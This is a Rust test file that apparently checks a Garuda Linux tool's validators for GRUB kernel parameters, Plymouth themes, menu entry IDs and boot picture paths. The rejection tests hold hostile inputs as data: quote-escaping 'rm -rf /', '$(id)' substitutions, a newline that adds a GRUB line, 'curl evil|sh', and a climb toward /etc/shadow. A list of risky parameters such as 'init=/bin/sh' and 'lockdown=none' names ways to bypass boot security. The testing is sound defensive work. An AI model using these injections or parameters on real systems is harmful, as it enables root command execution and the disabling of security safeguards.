mod paths;

use proptest::prelude::*;

use crate::{
    GrubPicture, GrubState, GrubThemeFile, KernelParameter, MenuEntryId, PlymouthTheme, Reason,
};

/// `/proc/cmdline` of the Lima image, booted by GRUB.
const LIMA_CMDLINE: &str = include_str!("../../../../system/src/host/fixtures/proc-cmdline");
/// `/proc/cmdline` of the Garuda live ISO, booted by systemd-boot.
const LIVE_CMDLINE: &str = include_str!("../../../../system/src/host/fixtures/live/proc-cmdline");
/// `/etc/default/grub` of a used Garuda install.
const INSTALLED_GRUB: &str = include_str!("../../grub/fixtures/installed/default-grub");
const GRUB_CFG: &str = include_str!("../../grub/fixtures/installed/grub.cfg");
const GRUB_BTRFS: &str = include_str!("../../grub/fixtures/installed/grub-btrfs.cfg");
const LIMA_GRUB: &str = include_str!("../../grub/fixtures/lima/default-grub");
/// `ls -1 /usr/share/plymouth/themes/` of the Lima image.
const PLYMOUTH_THEMES: &str = include_str!("../../../../system/src/boot/fixtures/plymouth-themes");

#[test]
fn the_words_of_a_real_grub_command_line_pass() {
    let installed = INSTALLED_GRUB
        .lines()
        .find_map(|line| line.strip_prefix("GRUB_CMDLINE_LINUX=\""))
        .and_then(|value| value.strip_suffix('"'))
        .unwrap();

    for parameter in LIMA_CMDLINE.split_whitespace().chain(installed.split(' ')) {
        assert_eq!(KernelParameter::new(parameter).unwrap().as_str(), parameter);
    }
}

/// The live ISO is no GRUB command line: its `initrd=` paths have
/// backslashes and its verity hashes are longer than any GRUB word.
#[test]
fn the_live_command_line_has_words_grub_never_gets() {
    let refused: Vec<(&str, Reason)> = LIVE_CMDLINE
        .split_whitespace()
        .filter_map(|word| {
            KernelParameter::new(word)
                .err()
                .map(|error| (word.split('=').next().unwrap(), error.reason()))
        })
        .collect();

    assert_eq!(
        refused,
        [
            ("initrd", Reason::InvalidCharacter('\\')),
            ("initrd", Reason::InvalidCharacter('\\')),
            ("initrd", Reason::InvalidCharacter('\\')),
            ("garuda.verity", Reason::TooLong { max: 255 }),
        ]
    );
}

/// Words a user types from the kernel documentation, for the characters
/// no captured command line has.
#[test]
fn documented_kernel_parameters_pass() {
    for parameter in [
        "splash",
        "mitigations=off",
        "sysrq_always_enabled=1",
        "video=1920x1080@60",
        "acpi_osi=!",
        "ip=[::1]",
        "module_blacklist=nouveau,nvidiafb",
        "resume=/dev/mapper/vg-swap",
        "usbcore.quirks=0bda:8153:k",
        "zswap.max_pool_percent=20%",
    ] {
        assert_eq!(KernelParameter::new(parameter).unwrap().as_str(), parameter);
    }
}

/// Each of these would end the quotes of `GRUB_CMDLINE_LINUX_DEFAULT`,
/// run a command while root sources the file, or start a second line.
#[test]
fn a_kernel_parameter_cannot_leave_its_quotes() {
    for (parameter, culprit) in [
        ("quiet\"", '"'),
        ("a\"; rm -rf /; \"", '"'),
        ("x=$(id)", '$'),
        ("x=`id`", '`'),
        ("x=a\\", '\\'),
        ("it's", '\''),
        ("two words", ' '),
        ("line\nGRUB_DEFAULT=9", '\n'),
        ("nul\0", '\0'),
        ("a;b", ';'),
        ("a|b", '|'),
        ("a&b", '&'),
        ("a>b", '>'),
        ("tab\tbed", '\t'),
        ("ümlaut", 'ü'),
    ] {
        let reason = KernelParameter::new(parameter).unwrap_err().reason();

        assert!(
            matches!(reason, Reason::InvalidCharacter(found) | Reason::InvalidStart(found) if found == culprit),
            "{parameter:?}: {reason:?}"
        );
    }
}

#[test]
fn a_kernel_parameter_is_bounded_and_not_empty() {
    assert_eq!(
        KernelParameter::new("").unwrap_err().reason(),
        Reason::Empty
    );
    KernelParameter::new("a".repeat(255)).unwrap();
    assert_eq!(
        KernelParameter::new("a".repeat(256)).unwrap_err().reason(),
        Reason::TooLong { max: 255 }
    );
}

/// A word with a leading `-` reads as an option to tools that take the
/// line apart, and `--` hands the rest of the line to init.
#[test]
fn a_kernel_parameter_starts_with_neither_a_dash_nor_an_equals_sign() {
    for (parameter, first) in [
        ("-x", '-'),
        ("--", '-'),
        ("-", '-'),
        ("=x", '='),
        ("=", '='),
    ] {
        assert_eq!(
            KernelParameter::new(parameter).unwrap_err().reason(),
            Reason::InvalidStart(first),
            "{parameter:?}"
        );
    }

    KernelParameter::new("a-b=c").unwrap();
}

#[test]
fn risky_kernel_parameters_are_known_by_their_key() {
    for risky in [
        "init=/bin/sh",
        "rd.break",
        "rd.break=pre-mount",
        "systemd.unit=emergency.target",
        "systemd.debug-shell",
        "systemd.debug-shell=1",
        "lockdown=none",
        "module.sig_enforce=0",
        "selinux=0",
        "apparmor=0",
    ] {
        assert!(KernelParameter::new(risky).unwrap().is_risky(), "{risky}");
    }

    for plain in [
        "quiet",
        "splash",
        "initrd=/boot/initramfs-linux.img",
        "init_on_alloc=1",
        "rd.breaking",
        "rd.luks.uuid=x",
        "systemd.unit_x=1",
        "systemd.debug-shellx",
        "lockdown",
        "selinux=1",
        "apparmor=1",
        "security=apparmor",
    ] {
        assert!(!KernelParameter::new(plain).unwrap().is_risky(), "{plain}");
    }
}

#[test]
fn a_plymouth_theme_is_one_folder_name_and_never_an_option() {
    for theme in PLYMOUTH_THEMES.lines() {
        assert_eq!(PlymouthTheme::new(theme).unwrap().as_str(), theme);
    }

    assert_eq!(
        PlymouthTheme::new("-R").unwrap_err().reason(),
        Reason::InvalidStart('-')
    );
    assert_eq!(
        PlymouthTheme::new("--reset").unwrap_err().reason(),
        Reason::InvalidStart('-')
    );
    assert_eq!(
        PlymouthTheme::new("..").unwrap_err().reason(),
        Reason::InvalidStart('.')
    );
    assert_eq!(
        PlymouthTheme::new("a/b").unwrap_err().reason(),
        Reason::InvalidCharacter('/')
    );
    assert_eq!(
        PlymouthTheme::new("a b").unwrap_err().reason(),
        Reason::InvalidCharacter(' ')
    );
    assert_eq!(
        PlymouthTheme::new("a\nb").unwrap_err().reason(),
        Reason::InvalidCharacter('\n')
    );
    assert_eq!(
        PlymouthTheme::new("a".repeat(65)).unwrap_err().reason(),
        Reason::TooLong { max: 64 }
    );
}

/// Every quoted title and id of the captured menus, as `GRUB_DEFAULT`
/// may name them, plus the positions and `saved` GRUB itself takes.
#[test]
fn menu_entry_ids_take_what_grub_writes() {
    let quoted = [GRUB_CFG, GRUB_BTRFS]
        .into_iter()
        .flat_map(str::lines)
        .map(str::trim_start)
        .filter(|line| line.starts_with("menuentry '") || line.starts_with("submenu '"))
        .flat_map(|line| line.split('\'').skip(1).step_by(2));

    for id in quoted.chain(["0", "1>2", "saved"]) {
        assert_eq!(MenuEntryId::new(id).unwrap().as_str(), id);
    }
}

#[test]
fn a_menu_entry_id_cannot_leave_its_quotes() {
    for (id, culprit) in [
        ("a\"b", '"'),
        ("a$b", '$'),
        ("a`b`", '`'),
        ("a\\b", '\\'),
        ("a\nb", '\n'),
        ("a\0b", '\0'),
        ("a\u{1b}[0m", '\u{1b}'),
    ] {
        assert_eq!(
            MenuEntryId::new(id).unwrap_err().reason(),
            Reason::InvalidCharacter(culprit),
            "{id:?}"
        );
    }

    assert_eq!(MenuEntryId::new("").unwrap_err().reason(), Reason::Empty);
    assert_eq!(
        MenuEntryId::new("--set").unwrap_err().reason(),
        Reason::InvalidStart('-')
    );
    assert_eq!(
        MenuEntryId::new("a".repeat(513)).unwrap_err().reason(),
        Reason::TooLong { max: 512 }
    );
}

#[test]
fn pictures_and_themes_are_plain_absolute_paths_of_their_type() {
    for picture in [
        "/usr/share/wallpapers/garuda/Dr460nized.png",
        "/boot/grub/background-2.jpeg",
        "/a.tga",
    ] {
        GrubPicture::new(picture).unwrap();
    }

    for config in [INSTALLED_GRUB, LIMA_GRUB] {
        let theme = GrubState::read(config).theme;

        assert_eq!(GrubThemeFile::new(&theme).unwrap().as_str(), theme);
    }
}

#[test]
fn a_path_that_is_relative_climbs_or_has_the_wrong_type_is_refused() {
    for (path, reason) in [
        ("", Reason::Empty),
        ("picture.png", Reason::InvalidStart('p')),
        ("~/picture.png", Reason::InvalidStart('~')),
        ("/usr/../etc/shadow.png", Reason::InvalidComponent),
        ("/usr/./a.png", Reason::InvalidComponent),
        ("/usr//a.png", Reason::InvalidComponent),
        ("/usr/a.png/", Reason::InvalidComponent),
        ("/", Reason::InvalidComponent),
        ("/usr/share/a.svg", Reason::WrongFileType),
        ("/usr/share/png", Reason::WrongFileType),
        ("/etc/shadow", Reason::WrongFileType),
        ("/a\".png", Reason::InvalidCharacter('"')),
        ("/a$(id).png", Reason::InvalidCharacter('$')),
        ("/a`id`.png", Reason::InvalidCharacter('`')),
        ("/a\\.png", Reason::InvalidCharacter('\\')),
        ("/a\nb.png", Reason::InvalidCharacter('\n')),
        ("/a\0.png", Reason::InvalidCharacter('\0')),
        ("/a;curl evil|sh.png", Reason::InvalidCharacter(';')),
        ("/a|id.png", Reason::InvalidCharacter('|')),
        ("/a&id.png", Reason::InvalidCharacter('&')),
        ("/a(id).png", Reason::InvalidCharacter('(')),
        ("/a*id.png", Reason::InvalidCharacter('*')),
        ("/a b/c.png", Reason::InvalidCharacter(' ')),
        ("/a\tb/c.png", Reason::InvalidCharacter('\t')),
    ] {
        assert_eq!(
            GrubPicture::new(path).unwrap_err().reason(),
            reason,
            "{path:?}"
        );
    }

    assert_eq!(
        GrubPicture::new(format!("/{}.png", "a".repeat(1024)))
            .unwrap_err()
            .reason(),
        Reason::TooLong { max: 1024 }
    );
    assert_eq!(
        GrubThemeFile::new("/usr/share/grub/themes/x/background.png")
            .unwrap_err()
            .reason(),
        Reason::WrongFileType
    );
    assert_eq!(
        GrubThemeFile::new("/usr/share/grub/themes/../../../etc/theme.txt")
            .unwrap_err()
            .reason(),
        Reason::InvalidComponent
    );
}

#[test]
fn invalid_values_do_not_deserialize() {
    serde_json::from_str::<KernelParameter>("\"a b\"").unwrap_err();
    serde_json::from_str::<PlymouthTheme>("\"-R\"").unwrap_err();
    serde_json::from_str::<MenuEntryId>("\"a$b\"").unwrap_err();
    serde_json::from_str::<GrubPicture>("\"/a/../b.png\"").unwrap_err();
    serde_json::from_str::<GrubThemeFile>("\"theme.txt\"").unwrap_err();
}

proptest! {
    #[test]
    fn a_kernel_parameter_never_starts_with_a_dash_or_an_equals_sign(
        first in "[-=]",
        rest in r"[A-Za-z0-9_.,:=/@+%!~^\[\]-]{0,40}",
    ) {
        let value = format!("{first}{rest}");
        let start = first.chars().next().unwrap();

        prop_assert_eq!(
            KernelParameter::new(&value).unwrap_err().reason(),
            Reason::InvalidStart(start)
        );
        let behind = format!("a{value}");

        prop_assert!(KernelParameter::new(&behind).is_ok());
    }
}
